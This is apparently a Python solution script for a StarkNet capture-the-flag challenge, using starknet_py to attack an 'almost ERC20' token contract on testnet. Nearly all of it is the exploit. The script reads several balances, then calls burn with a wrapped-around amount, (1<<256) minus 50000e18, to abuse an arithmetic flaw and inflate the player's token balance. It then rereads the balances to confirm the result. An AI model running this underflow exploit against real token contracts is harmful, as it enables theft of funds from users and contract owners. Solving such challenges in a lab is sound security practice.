import asyncio
import json

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.models import StarknetChainId
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starkware.crypto.signature.signature import private_to_stark_key
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash


async def main():
    # client = GatewayClient(net=testnet)
    client = GatewayClient("<RPC>", chain=StarknetChainId.TESTNET)
    player_private_key = 0x0 # PRIVATE_KEY
    contract_address = "<CONTRACT_ADDRESS>"

    player_public_key = private_to_stark_key(player_private_key)
    player_address = calculate_contract_address_from_hash(salt=20, class_hash=1803505466663265559571280894381905521939782500874858933595227108099796801620, constructor_calldata=[player_public_key], deployer_address=0, )
    player_key_pair = KeyPair(private_key=player_private_key, public_key=player_public_key)
    acc_client = AccountClient(client=client, address=player_address, key_pair=player_key_pair, chain=StarknetChainId.TESTNET, )

    almost_erc20_abi = json.load(open("almost_erc20_abi.json"))
    wrapper_contract = Contract(contract_address, almost_erc20_abi, acc_client, )

    result = await wrapper_contract.functions["balanceOf"].call(1337)
    print(result)
    result = await wrapper_contract.functions["balanceOf"].call(7331)
    print(result)
    result = await wrapper_contract.functions["balanceOf"].call(player_address)
    print(result)

    invocation = await wrapper_contract.functions["burn"].invoke(player_address, (1 << 256) - int(50000e18), max_fee=int(1e16))
    await invocation.wait_for_acceptance()

    print("after")
    result = await wrapper_contract.functions["balanceOf"].call(1337)
    print(result)
    result = await wrapper_contract.functions["balanceOf"].call(7331)
    print(result)
    result = await wrapper_contract.functions["balanceOf"].call(player_address)
    print(result)


asyncio.run(main())